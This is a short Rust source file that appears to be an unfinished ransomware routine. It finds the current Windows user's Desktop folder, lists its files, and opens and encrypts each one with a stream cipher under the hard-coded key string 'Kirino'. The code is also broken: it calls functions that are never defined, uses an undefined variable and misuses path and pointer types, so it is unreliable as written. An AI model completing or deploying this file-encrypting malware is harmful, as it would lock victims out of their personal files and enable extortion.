use std::path::PathBuf;
use thiserror::Error;
use seekable_stream_cipher::keccak::StreamCipher;
use std::fs::File;
use std::io::Read;
use std::io::*;

#[derive(Debug,Error)]
pub enum FileError {
    #[error("[failed] setting paths")]
    NullOfPath,
    #[error("[failed] generating key")]
    NotVaildKey
}


fn get_file_names(path: &str) -> std::io::Result<Vec<String>> {
    std::fs::read_dir(path)?
        .map(|res| {
        let entry = res?;
        Ok(entry.file_name().to_string_lossy().into_owned())
    })
    .collect()
}

fn main() -> std::io::Result<()>{
    // if !(cfg!(windows)) {
        let who_am_i= match whoami::realname(){
            Ok(string) => string,
            Err(err) => err.to_string()
        };
        let mut pathbuf= PathBuf::from("C:/");
        pathbuf.push("/Users/");
        pathbuf.push(who_am_i);
        pathbuf.push("/Desktop");

        let v_file_names= get_file_names(pathbuf.to_string()); // pathbuf to string
        
        // keep encrypted string buff -> buff free;
        for file_name in v_file_names {
            let mut data_buff: Box<[u8; 1024]> = Box::new([0u8; 1024]);
            pathbuf.push(file_name);
            
            open_file(pathbuf.to_string());
            
            let encrypted= encrypted.offset("Kirino");

            write(&mut data_buff as *mut Box<_>); 
        }

    // }
    Ok(())
}
